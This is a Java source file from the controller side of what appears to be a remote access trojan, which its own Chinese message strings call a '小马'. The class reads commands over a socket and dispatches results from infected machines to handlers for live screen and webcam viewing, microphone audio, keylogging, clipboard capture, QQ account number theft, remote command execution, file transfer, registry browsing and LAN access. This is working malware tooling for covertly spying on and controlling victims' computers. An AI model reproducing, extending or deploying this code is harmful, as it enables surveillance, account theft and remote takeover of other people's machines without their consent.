package me.server.utils;

import me.server.receive.*;

import javax.swing.*;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.net.Socket;
import java.util.Random;

public class ReceiveMessage{
    String IP;
    Socket socket;
    File file;
    Audio audio;
    DataInputStream dataInputStream;
    ScreenControl getScreen;
    SystemManager getTaskList;
    WebCam webCam;
    RemoteChat remoteChat;
    RemoteCmd remoteCmd;
    FileManager fileManage;
    GetQQNumber getQQNumber;
    ClipBorad clipBorad;
    KeyBoardHook hook;
    LANAccess lanAccess;
    FileOutputStream fileOutputStream;
    RegisterManager registerManager;
    public ReceiveMessage(Socket socket,String IP) throws Exception{
        this.dataInputStream = new DataInputStream(socket.getInputStream());
        this.socket = socket;
        this.IP = IP;
    }
    public void start() {
        try {
            while (true) {
                Thread.sleep(1);
                    byte[] head = SendMessage.receiveHead(dataInputStream);
                    int len;
                    long token;
                    byte[] context;
                    switch (head[0]) {
                        case MessageFlags.HEARTPACK:
                            //心跳包
                            break;
                        case MessageFlags.SHOW_SCREEN:
                            getScreen = new ScreenControl(socket,IP);
                            break;
                        case MessageFlags.UPDATE_SCREEN:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            getScreen.update(context);
                            break;
                        case MessageFlags.SHOW_TASKLIST:
                            getTaskList = new SystemManager(socket,IP);
                            break;
                        case MessageFlags.UPDATE_TASKLIST:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            getTaskList.taskListUpdate(context);
                            break;
                        case MessageFlags.UPDATE_SYSTEMINFO:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            getTaskList.systemUpdate(context);
                            break;
                        case MessageFlags.CAMERA_ERROR:
                            JOptionPane.showMessageDialog(null,"未找到摄像头!","错误",JOptionPane.ERROR_MESSAGE);
                            break;
                        case MessageFlags.SHOW_CAMERA:
                            webCam = new WebCam(socket,IP);
                            break;
                        case MessageFlags.UPDATE_CAMERA:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            webCam.update(context);
                            break;
                        case MessageFlags.SHOW_REMOTECHAT:
                            remoteChat = new RemoteChat(socket,IP);
                            break;
                        case MessageFlags.SEND_REMOTECHAT:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            remoteChat.update(context);
                            break;
                        case MessageFlags.SHOW_REMOTE_CMD:
                            remoteCmd = new RemoteCmd(socket,IP);
                            break;
                        case MessageFlags.EXECUTE_REMOTE_CMD:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            remoteCmd.update(context);
                            break;
                        case MessageFlags.SHOW_FILEWINDOW:
                            fileManage = new FileManager(socket,IP);
                            break;
                        case MessageFlags.FILE_QUERY:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            fileManage.update(context);
                            break;
                        case MessageFlags.FILE_DOWNLOAD_ERROR:
                            JOptionPane.showMessageDialog(null, "文件下载失败..(文件过大)", "提示", JOptionPane.ERROR_MESSAGE);
                            break;
                        case MessageFlags.FILE_CREATEWITHNAME:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            file = new File(System.getProperty("user.dir") + "\\" + new String(context));
                            file.createNewFile();
                            break;
                            case MessageFlags.FILE_PREPARE:
                                len = SendMessage.receiveLength(dataInputStream);
                                token = SendMessage.receiveToken(dataInputStream);
                                if(token == fileManage.Token) {
                                    System.out.println(token);
                                    context = SendMessage.receiveContext(dataInputStream,len);
                                    fileOutputStream = new FileOutputStream(file);
                                }
                                break;
                        case MessageFlags.FILE_DOWNLOAD:
                            len = SendMessage.receiveLength(dataInputStream);
                            token = SendMessage.receiveToken(dataInputStream);
                            try {
                                if(token == fileManage.Token) {
                                    System.out.println(token);
                                    context = SendMessage.receiveContext(dataInputStream, len);
                                    fileOutputStream.write(context);
                                }
                            } catch (Exception e) {
                            }
                            break;
                            case MessageFlags.FILE_DOWNLOAD_END:
                                len = SendMessage.receiveLength(dataInputStream);
                                context = SendMessage.receiveContext(dataInputStream, len);
                                String str = new String(context) + "$下载";
                                fileManage.Token = new Random().nextLong();
                                fileManage.arrayList.remove(str);
                                fileManage.flashTable();
                                fileOutputStream.close();
                                break;
                        case MessageFlags.FILE_UPLOAD_OK:
                            System.out.println(1);
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            String str1 = new String(context) + "$上传";
                            fileManage.arrayList.remove(str1);
                            fileManage.flashTable();
                            break;
                        case MessageFlags.SHOW_QQNUMBERWINDOW:
                            getQQNumber = new GetQQNumber(socket,IP);
                            break;
                        case MessageFlags.GET_QQNUMBER:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            getQQNumber.update(context);
                            break;
                        case MessageFlags.GET_QQNUMBER_ERROR:
                            JOptionPane.showMessageDialog(null, "获取QQ出错..", "提示", JOptionPane.ERROR_MESSAGE);
                            break;
                        case MessageFlags.SHOW_CLIPBORADWINDOW:
                            clipBorad = new ClipBorad(socket,IP);
                            break;
                        case MessageFlags.GET_CLIPBORAD:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            clipBorad.update(context);
                            break;
                        case MessageFlags.SHOW_KEYBORADWINDOW:
                            hook = new KeyBoardHook(socket,IP);
                            break;
                        case MessageFlags.UPDATE_KEYBORAD:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            hook.update(context);
                            break;
                        case MessageFlags.ENUM_WINDOWS:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            getTaskList.windowsUpdate(context);
                            break;
                        case MessageFlags.SHOW_WINDOW_ERROR:
                            JOptionPane.showMessageDialog(null,"检测到已经打开一个窗口,请勿多开!","错误",JOptionPane.ERROR_MESSAGE);
                            break;
                        case MessageFlags.REGIDTER_WINDOWS_SHOW:
                            registerManager = new RegisterManager(socket,IP);
                            break;
                        case MessageFlags.REGIDTER_QUERY_KEY:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            registerManager.update(context);
                            break;
                        case MessageFlags.REGIDTER_QUERY_VALUE:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            registerManager.updateValueTable(context);
                            break;
                        case MessageFlags.REGIDTER_ERROR:
                            JOptionPane.showMessageDialog(null,"不支持的数据类型.","错误",JOptionPane.ERROR_MESSAGE);
                            break;
                        case MessageFlags.UPDATE:
                            JOptionPane.showMessageDialog(null,"小马已经更新完成","提示",JOptionPane.INFORMATION_MESSAGE);
                            break;
                        case MessageFlags.AUDIO_WINDOWS_SHOW:
                            audio = new Audio(socket,IP);
                            break;
                        case MessageFlags.AUDIO_DATA:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            audio.play(context);
                            break;
                        case MessageFlags.AUDIO_ERROR:
                            JOptionPane.showMessageDialog(null,"麦克风初始化错误!","错误",JOptionPane.ERROR_MESSAGE);
                            break;
                        case MessageFlags.FILE_DELETE_ERROR:
                            JOptionPane.showMessageDialog(null,"文件删除失败","错误",JOptionPane.ERROR_MESSAGE);
                            break;
                        case MessageFlags.LAN_ACCESS_OPEN:
                            lanAccess = new LANAccess(socket,IP);
                            break;
                        case MessageFlags.LAN_ACCESS_GET:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            lanAccess.update(context);
                            break;
                        case MessageFlags.LAN_ACCESS_ERROR:
                            JOptionPane.showMessageDialog(null,"访问错误","错误",JOptionPane.ERROR_MESSAGE);
                            break;
                        case MessageFlags.LAN_ACCESS_POST:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            lanAccess.update(context);
                            break;
                }
            }
        }catch (Exception e) {

        }
    }
}
